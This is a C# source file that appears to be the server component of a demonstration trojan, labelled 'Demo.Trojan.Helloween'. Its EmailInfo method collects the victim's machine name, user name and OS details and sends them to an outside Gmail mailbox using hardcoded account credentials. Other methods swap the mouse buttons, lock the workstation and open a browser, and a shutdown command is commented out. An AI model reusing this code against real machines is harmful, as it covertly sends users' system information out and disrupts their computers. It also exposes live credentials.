using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Demo.Trojan.Helloween.Server
{
    public static class Funcoes
    {
        /// <summary>
        /// Method to lock workstation
        /// <see cref="http://pinvoke.net/default.aspx/user32/LockWorkStation.html"/>
        /// </summary>
        [DllImport("user32")]
        private static extern void LockWorkStation();

        /// <summary>
        /// This method is responsible for swap the mouse button
        /// </summary>
        /// <see cref="http://pinvoke.net/default.aspx/user32/SwapMouseButton.html"/>
        /// <param name="fSwap"></param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern bool SwapMouseButton(bool fSwap);
        #region Rotate

        #endregion

   
        public static void EmailInfo()
        {
            var corpo = new StringBuilder();
            corpo.AppendLine("<b>Nome da Maquina: </b>" + Environment.MachineName);
            corpo.AppendLine("<br /> <b>Nome do Usuario: </b>" + Environment.UserName);
            corpo.AppendLine("<br /> <b>Sistema: </b>" + Environment.OSVersion.Platform);
            corpo.AppendLine("<br /> <b> Versão do sistema: </b>" + Environment.OSVersion.Version);

            var servidor = new SmtpClient("smtp.gmail.com", 587);
            servidor.Credentials = new NetworkCredential("madruga.trojan@gmail.com", "madruga123");
            servidor.EnableSsl = true;

            var mail = new MailMessage();
            mail.From = new MailAddress("teste@teste.com");
            mail.To.Add(new MailAddress("madruga.trojan@gmail.com"));
            mail.IsBodyHtml = true;
            mail.Body = corpo.ToString();

            servidor.Send(mail);
            

        }
        public static void InverterBotoesMouse(bool inverter)
        {
            SwapMouseButton(inverter);
        }
        public static void BloquearEstacao()
        {
            LockWorkStation();
        }
        public static void AbrirInternetExplorer()
        {
            Process.Start("iexplore", "www.erickwendel.com.br");
            
        }
        public static void DesligarComputador()
        {
            //Process.Start("shutdown", "/s /t 50000");

        }



    }
}
